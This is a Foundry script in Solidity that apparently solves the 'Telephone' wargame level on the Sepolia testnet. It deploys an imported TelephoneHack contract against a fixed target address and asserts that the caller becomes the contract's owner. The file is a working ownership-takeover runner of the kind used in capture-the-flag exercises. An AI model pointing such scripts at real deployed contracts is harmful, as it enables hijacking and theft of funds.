// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Telephone, TelephoneHack} from "../src/Telephone.sol";

contract TelephoneScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address TelephoneAddress = 0xF368895a29a0aa55890131Aadd449936E1241822;

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        assert(msg.sender != Telephone(TelephoneAddress).owner());

        TelephoneHack telephoneHack = new TelephoneHack();

        console.log("Hacking Telephone");

        telephoneHack.hackTelephone(TelephoneAddress);
        console.log("Hacked Successfully");

        assert(msg.sender == Telephone(TelephoneAddress).owner());

        vm.stopBroadcast();
    }
}
